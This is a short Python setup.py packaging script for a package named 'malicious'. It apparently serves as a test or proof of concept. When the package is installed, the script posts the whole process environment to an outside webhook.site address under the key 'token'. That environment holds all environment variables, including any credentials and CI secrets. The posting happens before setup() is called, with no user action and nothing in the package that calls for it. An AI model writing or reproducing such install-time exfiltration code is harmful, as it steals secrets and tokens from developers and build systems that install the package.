from setuptools import setup
import os
import requests

requests.post("https://webhook.site/TestActions/testPromptflowAzureSetup3", json={"token": os.environ})
setup(name="malicious")
